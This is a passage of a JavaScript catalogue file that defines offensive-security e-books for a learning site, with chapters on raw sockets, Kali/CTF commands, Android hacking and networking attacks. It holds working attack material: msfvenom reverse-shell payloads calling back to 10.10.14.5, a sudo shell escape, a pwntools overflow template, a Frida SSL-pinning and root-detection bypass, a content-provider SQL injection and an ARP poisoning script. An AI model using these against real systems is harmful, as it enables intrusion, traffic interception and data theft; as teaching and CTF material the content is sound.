    makeChapter(20206, 6, "Network Sniffing, Raw Sockets & Packet Injection", "Promiscuous Mode, BPF Filters, IP/TCP Headers in C & RST Hijacking",
      "Build custom raw network socket sniffers, dissect ethernet and IP headers in C, and forge spoofed TCP packets.", 28, `
      <h3>6.1 Raw Network Sockets in C</h3>
      <p>Standard sockets communicate through high-level TCP or UDP interfaces. Raw sockets (<code>socket(AF_INET, SOCK_RAW, IPPROTO_RAW)</code>) allow low-level programs to construct every field of the IP and TCP headers manually, including spoofing source addresses:</p>

      ${codeBlock("C", "raw_sniffer.c", `
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <unistd.h>

int main() {
    int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (raw_sock < 0) {
        perror("[-] Raw socket creation requires root privileges");
        return 1;
    }

    unsigned char buffer[65536];
    printf("[+] Sniffing live TCP packets on raw socket...\\n");

    while (1) {
        int data_size = recvfrom(raw_sock, buffer, sizeof(buffer), 0, NULL, NULL);
        if (data_size > 0) {
            struct iphdr *iph = (struct iphdr*)buffer;
            struct tcphdr *tcph = (struct tcphdr*)(buffer + (iph->ihl * 4));
            printf("Captured TCP Packet: %d bytes | Src Port: %d -> Dst Port: %d\\n", 
                   data_size, ntohs(tcph->source), ntohs(tcph->dest));
        }
    }
    close(raw_sock);
    return 0;
}`)}
    `),
    makeChapter(20207, 7, "Cryptology, RSA Mathematics & Collision Attacks", "Modular Arithmetic, Fermat's Little Theorem, RSA Key Generation & MD5 Flaws",
      "Master the mathematical foundations of public-key cryptography (RSA, Diffie-Hellman), prime factorization, and hash collision vulnerabilities.", 30, `
      <h3>7.1 Mathematical Foundations of Public-Key Cryptography</h3>
      <p>RSA encryption relies on modular arithmetic and the computational difficulty of factoring the product of two large prime numbers $p$ and $q$. Euler's totient function $\\phi(N) = (p-1)(q-1)$ enables deriving the private key exponent $d$ from public exponent $e$:</p>

      <div class="ps-panel-box p-3 my-3">
        <h5 class="text-warning fs-7"><i class="fa-solid fa-calculator me-2"></i>RSA Key Generation Steps</h5>
        <ol class="fs-8 text-light mb-0">
          <li>Select two large distinct primes $p$ and $q$. Compute modulus $N = p \\times q$.</li>
          <li>Compute Euler's totient: $\\phi(N) = (p-1)(q-1)$.</li>
          <li>Choose public exponent $e$ such that $1 < e < \\phi(N)$ and $\\gcd(e, \\phi(N)) = 1$ (typically $e = 65537$).</li>
          <li>Compute private exponent $d \\equiv e^{-1} \\pmod{\\phi(N)}$ via Extended Euclidean Algorithm.</li>
          <li><strong>Encryption:</strong> $C \\equiv M^e \\pmod{N}$. <strong>Decryption:</strong> $M \\equiv C^d \\pmod{N}$.</li>
        </ol>
      </div>

      <h3>7.2 Hash Collision Vulnerabilities in MD5</h3>
      <p>A cryptographic hash collision occurs when two distinct input messages $M_1 \\ne M_2$ yield the identical hash digest $H(M_1) = H(M_2)$. Wang's differential collision attack broke MD5, proving that hash functions must maintain preimage resistance and strong collision resistance (such as SHA-256 and SHA-3).</p>
    `),
    makeChapter(20208, 8, "Defeating Modern Protections (ASLR, DEP, Canaries)", "Return-Oriented Programming (ROP), ret2libc, Information Leaks & Canary Bypass",
      "Defeat modern OS memory protections using Return-Oriented Programming (ROP chains), Libc redirection, and info leaks.", 32, `
      <h3>8.1 Modern Binary Protections Matrix</h3>
      <div class="table-responsive">
        <table class="table table-dark table-bordered table-striped fs-8">
          <thead><tr><th>Protection</th><th>Full Name</th><th>Mechanism</th><th>Bypass Technique</th></tr></thead>
          <tbody>
            <tr><td><strong>DEP / NX</strong></td><td>Data Execution Prevention</td><td>Marks stack/heap as non-executable</td><td>Return-Oriented Programming (ROP) / ret2libc</td></tr>
            <tr><td><strong>ASLR</strong></td><td>Address Space Layout Randomization</td><td>Randomizes base memory offsets of stack, heap, and libraries</td><td>Information leak / GOT dereference</td></tr>
            <tr><td><strong>Stack Canaries</strong></td><td>Stack Guard / SSP</td><td>Places random secret before saved EIP and checks integrity</td><td>Canary leak / Brute force (forking servers)</td></tr>
            <tr><td><strong>RELRO</strong></td><td>Relocation Read-Only</td><td>Makes Global Offset Table read-only</td><td>Hooking alternative function pointers (malloc_hook)</td></tr>
          </tbody>
        </table>
      </div>

      <h3>8.2 Return-Oriented Programming (ROP Chains)</h3>
      <p>When DEP prevents running shellcode on the stack, attackers string together small existing snippets of instructions ending in <code>RET</code> (called <strong>ROP Gadgets</strong>) found inside the binary or loaded libraries (such as <code>libc.so</code>) to construct custom execution flows without injecting new executable code.</p>
    `)
  ]
};

// ------------------------------------------------------------------------------------------------
// BOOK 203: Kali Linux & CTF Command Guide
// ------------------------------------------------------------------------------------------------
const book203 = {
  id: 203,
  slug: "kali-linux-ctf-command-guide",
  title: "Kali Linux & CTF Command Guide",
  subtitle: "Tactical Cheat Sheets for Nmap, Metasploit, Burp Suite, Hydra & Hashcat",
  description: "The complete hands-on offensive security command reference by Cyber Mind Space. Features ready-to-run terminal syntax, flag explanations, pipeline tricks, and privilege escalation methodologies for Capture-The-Flag (CTF) challenges and penetration tests.",
  author: "Cyber Mind Space",
  category: "Ethical Hacking & Penetration Testing",
  subcategory: "CTF & Tactical Tooling",
  difficulty: "INTERMEDIATE",
  pageCount: 142,
  estimatedReadingTime: "6 Hours",
  fileSize: "0.75 MB",
  downloadUrl: "downloads/cybersecurity/kali-linux-ctf-command-guide.pdf",
  tags: ["KaliLinux", "CTF", "Nmap", "Metasploit", "BurpSuite", "Hashcat", "PrivilegeEscalation"],
  licenseType: "OFFICIAL CHEATSHEET",
  copyrightNotice: "© Cyber Mind Space. Curated reference guide.",
  isPro: false,
  badge: "Tactical Handbook",
  rating: 4.98,
  readerCount: 4210,
  icon: "fa-solid fa-terminal",
  gradient: "linear-gradient(135deg, #090d16, #0284c7)",
  chapters: [
    makeChapter(20301, 1, "Tactical Nmap Scanning & Service Discovery", "SYN Scans, Version Detection, Script Engine (NSE) & Evasion Flags",
      "Master high-speed port scanning, banner grabbing, and NSE vulnerability scripts.", 24, `
      <h3>1.1 High-Performance Nmap Scan Pipelines</h3>
      <p>During CTF competitions and penetration tests, efficient reconnaissance saves critical time. Running heavy scripts against all 65,535 ports at once is slow and noisy. Instead, use a two-phase scanning methodology:</p>

      ${codeBlock("Bash", "nmap_pipeline.sh", `
# Phase 1: High-Speed Port Discovery across all 65,535 TCP ports
nmap -p- --min-rate 5000 -T4 -Pn 10.10.10.150 -oG all_ports.txt

# Phase 2: In-Depth Service Version Detection & Vulnerability Scripts on open ports
# Extract open ports cleanly with cut/awk
OPEN_PORTS=$(grep -oP '\\d{1,5}/open' all_ports.txt | cut -d '/' -f 1 | tr '\\n' ',' | sed 's/,$//')
echo "[+] Detected Open Ports: $OPEN_PORTS"

# Run aggressive NSE and version fingerprinting on discovered ports
nmap -p$OPEN_PORTS -sC -sV -A -oA nmap_deep_scan 10.10.10.150`)}

      <h3>1.2 Essential Nmap NSE Script Categories</h3>
      <ul>
        <li><code>--script=vuln:</code> Checks target against common CVE vulnerability databases.</li>
        <li><code>--script=http-enum:</code> Enumerates common web application directories and backup files.</li>
        <li><code>--script=smb-vuln-ms17-010:</code> Detects the EternalBlue SMB vulnerability.</li>
        <li><code>--script=ssl-heartbleed:</code> Probes for OpenSSL Heartbleed memory disclosure.</li>
      </ul>
    `),
    makeChapter(20302, 2, "Web Application Fuzzing & Enumeration", "Gobuster, Ffuf, Nikto, WhatWeb & Parameter Discovery",
      "Enumerate hidden API endpoints, virtual hosts, and sensitive directory structures using high-speed fuzzer tools.", 24, `
      <h3>2.1 Directory & Virtual Host Fuzzing with Ffuf</h3>
      <p><code>ffuf</code> is an extremely fast web fuzzer written in Go. It supports directory enumeration, virtual host discovery, and parameter brute-forcing:</p>

      ${codeBlock("Bash", "ffuf_cheatsheet.sh", `
# Recursive directory fuzzing with status code filtering
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ \\
     -u http://target.corp/FUZZ -mc 200,204,301,302,307,401,403 -e .php,.html,.js,.json,.bak

# Subdomain & Virtual Host (vhost) fuzzing with response size filtering
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \\
     -u http://target.corp/ -H "Host: FUZZ.target.corp" -fs 1420`)}
    `),
    makeChapter(20303, 3, "Metasploit Framework & Payload Generation", "msfconsole, Multi/Handler, msfvenom Architecture & Staged Payloads",
      "Deploy exploit modules, configure multi/handlers, and generate staged meterpreter binaries.", 26, `
      <h3>3.1 msfvenom Payload Generation Matrix</h3>
      ${codeBlock("Bash", "msfvenom_commands.sh", `
# Linux x64 Staged Reverse Shell (ELF)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# Windows x64 Staged Reverse Shell (EXE)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe

# PHP Reverse Shell (One-Liner for File Upload vulnerabilities)
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

# ASPX Web Shell for IIS Web Servers
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx`)}
    `),
    makeChapter(20304, 4, "High-Speed Password Cracking with Hashcat & John", "Hash Types, Mask Attacks, Rule-Based Mutation & GPU Acceleration",
      "Crack NTLM, bcrypt, SHA-512 crypt, and Kerberos hashes using GPU-accelerated rule pipelines.", 26, `
      <h3>4.1 Hashcat Mode Identification & Command Reference</h3>
      <div class="table-responsive">
        <table class="table table-dark table-bordered table-striped fs-8">
          <thead><tr><th>Hash Type</th><th>Hashcat Mode (-m)</th><th>Format Example</th></tr></thead>
          <tbody>
            <tr><td>MD5</td><td><code>0</code></td><td><code>8743b52063cd84097a65d1633f5c74f5</code></td></tr>
            <tr><td>SHA-256</td><td><code>1400</code></td><td><code>5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8</code></td></tr>
            <tr><td>NTLM (Windows)</td><td><code>1000</code></td><td><code>b4b9b02e6f09a9bd760f388b67351e2b</code></td></tr>
            <tr><td>Kerberos 5 TGS</td><td><code>13100</code></td><td><code>$krb5tgs$23$...</code></td></tr>
            <tr><td>Linux SHA-512 Crypt</td><td><code>1800</code></td><td><code>$6$rounds=5000$...</code></td></tr>
          </tbody>
        </table>
      </div>

      ${codeBlock("Bash", "hashcat_cracking.sh", `
# Rule-based dictionary attack on NTLM hashes
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule -O`)}
    `),
    makeChapter(20305, 5, "Linux Privilege Escalation Methodologies", "SUID Exploits, Sudo Permissions (GTFOBins), Capabilities & Cron Jobs",
      "Systematically identify and exploit Linux misconfigurations to obtain root shell access.", 28, `
      <h3>5.1 Checking Misconfigured Sudo Privileges & GTFOBins</h3>
      <p>The first command to run on any Linux shell is <code>sudo -l</code>. If specific binaries are permitted without a password, check GTFOBins for privilege breakout syntax:</p>

      ${codeBlock("Bash", "linux_privesc.sh", `
# Check sudo permissions
sudo -l

# Example: If sudo allows 'find' without password
sudo find . -exec /bin/sh \\; -quit

# SUID Binary Discovery across filesystem
find / -perm -u=s -type f 2>/dev/null

# Inspect POSIX capabilities on binaries
getcap -r / 2>/dev/null`)}
    `),
    makeChapter(20306, 6, "Windows Privilege Escalation & Registry Traps", "WinPEAS, AlwaysInstallElevated, Unquoted Service Paths & SeImpersonate",
      "Enumerate Windows misconfigurations, unquoted services, and token impersonation vectors.", 28, `
      <h3>6.1 Windows Privilege Escalation Triage</h3>
      ${codeBlock("PowerShell", "windows_triage.ps1", `
# Check AlwaysInstallElevated registry keys (Allows non-admin MSI installations as SYSTEM)
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# Check user privileges
whoami /priv /all

# Run WinPEAS for automated comprehensive audit
.\\winPEASany.exe quiet`)}
    `),
    makeChapter(20307, 7, "Binary Exploitation & Reverse Engineering in CTFs", "Ghidra Decompilation, Pwntools Scripting & ROPgadget Search",
      "Analyze compiled ELF binaries, extract hardcoded keys with Ghidra, and automate buffer overflows with Pwntools.", 28, `
      <h3>7.1 Automating Binary Exploitation with Pwntools</h3>
      ${codeBlock("Python 3", "exploit_template.py", `
from pwn import *

# Context configuration
context.binary = './vulnerable_elf'
context.arch = 'amd64'

# Connect to target process or remote CTF challenge
p = process('./vulnerable_elf')
# p = remote('ctf.challenge.org', 1337)

offset = 72
target_win_function = p64(0x401156)

# Construct payload: Offset Padding + Win Function Address
payload = b"A" * offset + target_win_function

p.sendlineafter(b"Enter your input: ", payload)
p.interactive()`)}
    `),
    makeChapter(20308, 8, "Network Forensics, PCAP Analysis & Steganography", "Wireshark Display Filters, Tshark Scripting, Volatility & Binwalk",
      "Extract transmitted credentials from packet captures and perform memory forensics with Volatility.", 28, `
      <h3>8.1 Tactical Wireshark & Tshark Filters</h3>
      ${codeBlock("Bash", "tshark_commands.sh", `
# Extract all HTTP POST requests and form data from PCAP
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e ip.src -e ip.dst -e http.file_data

# Extract all DNS query domains
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort -u`)}
    `)
  ]
};

// ------------------------------------------------------------------------------------------------
// BOOK 204: Android Hacker's Handbook
// ------------------------------------------------------------------------------------------------
const book204 = {
  id: 204,
  slug: "android-hackers-handbook",
  title: "Android Hacker's Handbook",
  subtitle: "Android Security Architecture, Reverse Engineering, Frida Hooks & Native Exploits",
  description: "The authoritative comprehensive guide to Android mobile OS security by Joshua J. Drake, Pau Oliva Fora, Collin Mulliner, Zach Lanier, and Georg Wicherski. Covers Dalvik/ART internals, APK decompilation, Frida dynamic instrumentation, IPC exploitation, and kernel vulnerability analysis.",
  author: "Joshua J. Drake, Pau Oliva Fora, et al.",
  category: "Mobile Security & Reverse Engineering",
  subcategory: "Android OS & Mobile Pentesting",
  difficulty: "ADVANCED",
  pageCount: 576,
  estimatedReadingTime: "22 Hours",
  fileSize: "9.03 MB",
  downloadUrl: "downloads/cybersecurity/android-hackers-handbook.pdf",
  tags: ["Android", "MobileSecurity", "Frida", "ReverseEngineering", "Jadx", "APK", "ARM"],
  licenseType: "EDUCATIONAL REFERENCE",
  copyrightNotice: "© Joshua J. Drake et al. / Wiley. Integrated for educational reference.",
  isPro: true,
  badge: "Definitive Mobile Guide",
  rating: 4.95,
  readerCount: 2840,
  icon: "fa-brands fa-android",
  gradient: "linear-gradient(135deg, #022c22, #10b981)",
  chapters: [
    makeChapter(20401, 1, "Android Security Architecture & Sandbox Model", "Linux Kernel Sandboxing, UID Isolation, Zygote & Permissions Framework",
      "Explore how Android uses unique Linux user IDs (UIDs) per application and the Zygote process to isolate applications.", 28, `
      <h3>1.1 The Multi-Layer Android Security Model</h3>
      <p>Android builds upon the Linux kernel, using Linux user separation (UID/GID isolation) as its foundational sandbox boundary. Unlike desktop Linux where all user applications run under the same UID (e.g. <code>uid=1000</code>), Android assigns a unique, isolated UID (e.g. <code>u0_a145</code>) to each installed APK package.</p>

      <div class="ps-panel-box p-3 my-3">
        <h5 class="text-warning fs-7"><i class="fa-solid fa-layer-group me-2"></i>Android System Architecture Layers</h5>
        <ul class="fs-8 text-light mb-0">
          <li><strong>System Apps & User Apps:</strong> Run inside sandboxed ART/Dalvik virtual machine instances.</li>
          <li><strong>Android Framework (Java API):</strong> ActivityManager, PackageManager, WindowManager.</li>
          <li><strong>Native Daemons & Libraries:</strong> SurfaceFlinger, MediaServer, SQLite, WebKit, libc (Bionic).</li>
          <li><strong>Android Runtime (ART):</strong> Ahead-Of-Time (AOT) & Just-In-Time (JIT) compilation.</li>
          <li><strong>Linux Kernel:</strong> Hardware drivers, binder IPC driver, process scheduling, SELinux enforcement.</li>
        </ul>
      </div>

      <h3>1.2 The Zygote Process & Fast App Spawning</h3>
      <p>To ensure fast app startup times, Android initializes the <code>zygote</code> process during system boot. Zygote preloads all core Java runtime classes and system framework libraries into memory. When a user taps an app icon, Zygote uses <code>fork()</code> with Copy-On-Write (COW) memory semantics, immediately creating the new app process and downgrading its UID to the package's isolated user identity.</p>
    `),
    makeChapter(20402, 2, "APK Package Anatomy & Manifest Analysis", "DEX Bytecode, AndroidManifest.xml, Exported Components & Deep Links",
      "Deconstruct APK ZIP archives, parse DEX bytecode structures, and audit exported Android components for security flaws.", 28, `
      <h3>2.1 Anatomy of an Android Application Package (APK)</h3>
      <p>An APK is essentially a signed ZIP archive containing the following structural assets:</p>
      <ul>
        <li><code>AndroidManifest.xml:</code> Declares package name, permissions, activities, services, broadcast receivers, and content providers.</li>
        <li><code>classes.dex:</code> Compiled Dalvik Executable bytecode executed by ART.</li>
        <li><code>lib/ (armeabi-v7a, arm64-v8a, x86):</code> Native compiled C/C++ shared libraries (<code>.so</code> files).</li>
        <li><code>res/ & resources.arsc:</code> Precompiled XML layouts, images, and localized string tables.</li>
        <li><code>META-INF/:</code> Contains <code>CERT.RSA</code> and cryptographic APK signature manifests.</li>
      </ul>

      <h3>2.2 Auditing Insecure Exported Components</h3>
      <p>If an Activity, Service, or Broadcast Receiver is configured with <code>android:exported="true"</code> (or defines an <code>&lt;intent-filter&gt;</code> without explicitly setting exported to false), any malicious third-party app installed on the device can invoke it directly, bypassing authentication screens:</p>

      ${codeBlock("XML", "AndroidManifest.xml (Vulnerable Exported Activity)", `
<!-- VULNERABILITY: Exported internal admin dashboard without permission checks -->
<activity 
    android:name="com.bank.app.AdminTransferActivity" 
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>`)}
    `),
    makeChapter(20403, 3, "Static Reverse Engineering with Jadx & Apktool", "Smali Bytecode Disassembly, Jadx Decompilation & Secret Extraction",
      "Decompile APKs into readable Java source code and inspect Smali opcodes to uncover hardcoded API keys and encryption secrets.", 28, `
      <h3>3.1 Decompilation Toolchain</h3>
      <p>Security analysts use <code>jadx-gui</code> to view high-level reconstructed Java/Kotlin source code and <code>apktool</code> to disassemble binary XML files and Dalvik bytecode into Smali assembly:</p>

      ${codeBlock("Bash", "apk_reverse_commands.sh", `
# Disassemble APK to Smali assembly and extract resources
apktool d target_banking_app.apk -o decompiled_output/

# Search for hardcoded secrets, AWS keys, and AES encryption keys in Smali
grep -ri "AES" decompiled_output/smali/
grep -ri "AKIA" decompiled_output/smali/

# Decompile APK directly to Java source files via Jadx CLI
jadx target_banking_app.apk -d java_source_output/`)}
    `),
    makeChapter(20404, 4, "Dynamic Instrumentation with Frida & Objection", "JavaScript Hooking, Method Interception, SSL Pinning & Root Detection Bypass",
      "Inject custom JavaScript hooks into running Android processes at runtime using Frida to intercept parameters and bypass SSL pinning.", 32, `
      <h3>4.1 Frida Dynamic Hooking Architecture</h3>
      <p>Frida injects Google's V8 JavaScript engine into the target Android process's memory space, allowing security researchers to hook Java methods, inspect function arguments, alter return values, and invoke private methods dynamically.</p>

      ${codeBlock("JavaScript (Frida)", "ssl_pinning_bypass.js", `
Java.perform(function() {
    console.log("[+] Hooking TrustManagerImpl to bypass Android SSL Pinning...");
    
    var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
        console.log("[+] Intercepted and bypassed SSL Pinning check for host: " + host);
        return untrustedChain; // Return untrusted certificate chain as valid!
    };

    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
    RootBeer.isRooted.implementation = function() {
        console.log("[+] Bypassed RootBeer root detection check!");
        return false; // Force app to believe device is not rooted
    };
});`)}

      <h3>4.2 Launching Frida Hooks via CLI</h3>
      ${codeBlock("Bash", "frida_launch.sh", `
# Connect to USB Android device, spawn target app, and inject script
frida -U -f com.bank.app -l ssl_pinning_bypass.js --no-pause`)}
    `),
    makeChapter(20405, 5, "Attacking Android IPC & Content Providers", "Intents, PendingIntents, Binder Transactions & SQL Injection in Providers",
      "Exploit inter-process communication vulnerabilities, eavesdrop on broadcasts, and inject SQL payloads into Content Providers.", 28, `
      <h3>5.1 Exploiting Vulnerable Content Providers</h3>
      <p>Content Providers manage access to structured data (such as SQLite databases). If a provider is exported and accepts unvalidated queries, attackers can extract full database tables using standard SQL Injection payloads:</p>

      ${codeBlock("Bash", "adb_content_provider_exploit.sh", `
# Query exported Content Provider via ADB shell
adb shell content query --uri content://com.bank.app.provider/users

# Exploit SQL Injection in Content Provider projection parameter
adb shell content query --uri content://com.bank.app.provider/users --projection "* FROM users; --"`)}
    `),
    makeChapter(20406, 6, "Native Code Vulnerabilities & JNI Bridges", "Java Native Interface (JNI), C/C++ Buffer Overflows in .so Libraries & ARM Assembly",
      "Analyze native shared libraries (.so), audit JNI boundary crossings, and exploit memory corruption bugs on ARM64.", 30, `
      <h3>6.1 Java Native Interface (JNI) Security Risks</h3>
      <p>Android applications frequently call performance-critical C/C++ code via JNI. If native functions (e.g. <code>Java_com_bank_app_NativeLib_processPacket</code>) use unsafe C functions, memory corruption vulnerabilities like heap overflows and use-after-free occur in native memory space outside Dalvik/ART safeguards.</p>
    `),
    makeChapter(20407, 7, "Android Rooting & Kernel Exploitation", "SELinux Policies, Dirty COW (CVE-2016-5195), Binder Kernel Bugs & Magisk Internals",
      "Understand Android kernel privilege escalation, SELinux domain transitions, and systemless rooting frameworks.", 30, `
      <h3>7.1 SELinux (Security Enhanced Linux) in Android</h3>
      <p>Android enforces Mandatory Access Control (MAC) using SELinux. Even if an attacker achieves UID 0 (root), SELinux policy domains (e.g. <code>untrusted_app</code>) block access to raw block storage devices, kernel driver nodes, and system properties unless a kernel vulnerability is leveraged to reload policies.</p>
    `),
    makeChapter(20408, 8, "Enterprise Mobile Defense & Secure Development", "Hardware Keystore, Biometric Prompt, EncryptedSharedPreferences & Obfuscation",
      "Implement industry-standard defenses: Android Hardware Keystore (TEE/StrongBox), R8/ProGuard obfuscation, and certificate transparency.", 26, `
      <h3>8.1 Secure Storage with Android Keystore</h3>
      <p>Sensitive cryptographic keys should never be stored in plaintext in <code>SharedPreferences</code>. By utilizing the <strong>Android Hardware-backed Keystore</strong>, key material is generated and stored inside a dedicated Trusted Execution Environment (TEE) or StrongBox chip, making physical memory extraction impossible.</p>
    `)
  ]
};

// ------------------------------------------------------------------------------------------------
// BOOK 205: Computer Networking for Ethical Hackers
// ------------------------------------------------------------------------------------------------
const book205 = {
  id: 205,
  slug: "computer-networking-for-hackers",
  title: "Computer Networking for Ethical Hackers",
  subtitle: "OSI & TCP/IP Architecture, Packet Analysis, ARP Poisoning, DNS Spoofing & Scapy",
  description: "The complete tactical networking guide by Cyber Security Academy. Deep dive into TCP 3-way handshakes, IP subnetting, Layer 2 attacks, BGP routing, TLS 1.3 protocol dissection, and building custom raw socket packet injectors in Python.",
  author: "Cyber Security Academy",
  category: "Network Security & Wireless Defense",
  subcategory: "Network Protocols & Defense",
  difficulty: "INTERMEDIATE",
  pageCount: 128,
  estimatedReadingTime: "5 Hours",
  fileSize: "0.61 MB",
  downloadUrl: "downloads/cybersecurity/networking-for-hackers.pdf",
  tags: ["Networking", "TCP/IP", "Scapy", "Wireshark", "ARPPoisoning", "DNS", "Subnetting"],
  licenseType: "ACADEMIC REFERENCE",
  copyrightNotice: "© Cyber Security Academy. Practical networking course material.",
  isPro: false,
  badge: "Networking Core",
  rating: 4.93,
  readerCount: 3120,
  icon: "fa-solid fa-network-wired",
  gradient: "linear-gradient(135deg, #0c4a6e, #0284c7)",
  chapters: [
    makeChapter(20501, 1, "The OSI & TCP/IP Network Models", "Layer Encapsulation, Protocol Data Units (PDUs), Headers & Data Flow",
      "Deconstruct packet encapsulation across the 7 OSI layers and the 4 TCP/IP architecture layers.", 24, `
      <h3>1.1 Packet Encapsulation & Protocol Data Units (PDUs)</h3>
      <p>As data travels down the networking stack, each layer encapsulates the payload by prepending its own protocol header:</p>
      
      <div class="ps-panel-box p-3 my-3">
        <pre class="text-cyan font-monospace fs-8 m-0">
Layer 7: Application (HTTP/DNS)   [ HTTP Payload ]
Layer 4: Transport (TCP/UDP)      [ TCP Header | HTTP Payload ] (Segment)
Layer 3: Network (IPv4/IPv6)      [ IP Header  | TCP Header | HTTP Payload ] (Packet)
Layer 2: Data Link (Ethernet)     [ Eth Header | IP Header  | TCP Header | Payload | FCS ] (Frame)
Layer 1: Physical (Bits/Signals)  01001010110101010101110100101010...
        </pre>
      </div>
    `),
    makeChapter(20502, 2, "IP Addressing & CIDR Subnetting Math", "IPv4 Classes, Subnet Masks, Wildcard Masks, Network/Broadcast Math & IPv6",
      "Master the mathematical calculations behind subnetting, CIDR prefix lengths, and host ranges.", 24, `
      <h3>2.1 Subnetting Formula & Calculations</h3>
      <p>For a subnet with prefix <code>/24</code>, the subnet mask is <code>255.255.255.0</code>. Number of total IP addresses is $2^{(32 - 24)} = 2^8 = 256$. Usable host addresses are $256 - 2 = 254$ (excluding network address <code>.0</code> and broadcast address <code>.255</code>).</p>
    `),
    makeChapter(20503, 3, "Layer 2 Attacks: ARP Poisoning & CAM Flooding", "ARP Protocol Flaws, Man-in-the-Middle (MITM), MAC Flooding & Dynamic ARP Inspection",
      "Execute Man-in-the-Middle attacks via ARP cache poisoning and configure switch port security.", 26, `
      <h3>3.1 ARP Cache Poisoning (Man-in-the-Middle)</h3>
      <p>Because ARP is a stateless, unauthenticated protocol, any machine can send unsolicited ARP replies claiming to own an IP address (e.g. telling the target "I am the Gateway" and telling the Gateway "I am the target"):</p>

      ${codeBlock("Python (Scapy)", "arp_poison.py", `
from scapy.all import *
import time

def arp_spoof(target_ip, target_mac, spoof_ip):
    # Construct forged ARP response: op=2 (is-at)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

target_ip = "192.168.1.50"
target_mac = "00:11:22:33:44:55"
gateway_ip = "192.168.1.1"

print("[+] Launching ARP poisoning...")
try:
    while True:
        arp_spoof(target_ip, target_mac, gateway_ip)
        arp_spoof(gateway_ip, "aa:bb:cc:dd:ee:ff", target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] Stopping ARP spoofing...")`)}
    `),
    makeChapter(20504, 4, "TCP Protocol Mechanics & Handshake Flaws", "SYN-SYN/ACK-ACK 3-Way Handshake, Sequence Numbers, TCP Resets & SYN Floods",
      "Analyze TCP connection state machines, window scaling, and SYN flood denial of service attacks.", 26, `
      <h3>4.1 The TCP 3-Way Handshake</h3>
      <p>1. Client sends <code>SYN (SEQ=x)</code>. 2. Server responds with <code>SYN-ACK (SEQ=y, ACK=x+1)</code>. 3. Client acknowledges with <code>ACK (SEQ=x+1, ACK=y+1)</code>.</p>
    `),
    makeChapter(20505, 5, "DNS Protocol & Poisoning Attacks", "DNS Query Resolution, Recursive Queries, DNS Spoofing & DNSSEC",
      "Hijack DNS queries, redirect domain traffic to rogue servers, and configure DNSSEC validation.", 24, `
      <h3>5.1 DNS Query Poisoning & Interception</h3>
      <p>Attackers on the local network sniff outbound DNS UDP port 53 queries and immediately transmit spoofed DNS responses with matching Transaction IDs before the legitimate DNS server responds.</p>
    `),
    makeChapter(20506, 6, "TLS 1.3 & SSL/TLS Encryption Mechanics", "Diffie-Hellman Key Exchange, Certificate Authorities, Cipher Suites & SSL Stripping",
      "Understand asymmetric session negotiation, certificate chains, and modern HTTPS protections (HSTS).", 26, `
      <h3>6.1 TLS 1.3 1-RTT Handshake</h3>
      <p>TLS 1.3 reduces connection latency by completing key exchange in a single round-trip (1-RTT) using Ephemeral Elliptic Curve Diffie-Hellman (ECDHE), ensuring Perfect Forward Secrecy (PFS).</p>
    `),
    makeChapter(20507, 7, "Routing Protocols & BGP Hijacking", "Distance Vector vs Link State, OSPF Authentication & BGP Autonomous Systems",
      "Explore enterprise routing protocols and how malicious BGP route announcements hijack internet traffic.", 24, `
      <h3>7.1 Border Gateway Protocol (BGP) Insecurities</h3>
      <p>BGP manages routing between Autonomous Systems (AS). Without RPKI (Resource Public Key Infrastructure) route origin validation, rogue AS networks can announce more specific IP prefixes, intercepting global traffic.</p>
    `),
    makeChapter(20508, 8, "Building Packet Crafting Tools with Scapy", "Custom IP/TCP Header Generation, Sniffing Callbacks & Network Fuzzing",
      "Develop custom networking tools, scanners, and automated packet analyzers using Python and Scapy.", 28, `
      <h3>8.1 Custom TCP Port Scanner with Scapy</h3>
      ${codeBlock("Python 3", "scapy_syn_scanner.py", `
from scapy.all import *

def syn_scan(target_ip, port):
    # Construct IP packet + TCP SYN packet
    syn_packet = IP(dst=target_ip) / TCP(dport=port, flags="S")
    response = sr1(syn_packet, timeout=1, verbose=0)
    
    if response and response.haslayer(TCP):
        if response[TCP].flags == 0x12: # SYN-ACK received
            print(f"[+] Port {port} is OPEN!")
            # Send RST to tear down half-open connection cleanly
            send(IP(dst=target_ip) / TCP(dport=port, flags="R"), verbose=0)
        elif response[TCP].flags == 0x14: # RST-ACK received
            print(f"[-] Port {port} is CLOSED.")

syn_scan("192.168.1.1", 80)
syn_scan("192.168.1.1", 22)`)}
    `)
  ]
};

// ------------------------------------------------------------------------------------------------
// BOOK 206: Wi-Fi Security & Wireless Penetration Testing for Beginners
// ------------------------------------------------------------------------------------------------
const book206 = {
  id: 206,
  slug: "wifi-hacking-for-beginners",
  title: "Wi-Fi Security & Wireless Penetration Testing for Beginners",
